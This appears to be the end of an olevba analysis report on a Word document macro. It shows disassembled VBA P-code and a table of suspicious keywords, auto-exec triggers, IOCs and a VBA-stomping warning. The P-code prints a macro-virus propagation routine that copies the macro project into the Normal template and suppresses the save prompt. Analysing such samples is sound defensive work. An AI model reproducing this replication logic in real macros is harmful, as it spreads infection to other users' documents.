' 	ArgsMemCall SaveAs 0x0002 
' Line #186:
' 	EndIfBlock 
' Line #187:
' 	StartForVariable 
' 	Next 
' Line #188:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #189:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "增益集"
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #190:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "增益集"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #191:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	StartForVariable 
' 	Next 
' Line #194:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #195:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.trend.com|URL                                          |
|          |.tw/                |                                             |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

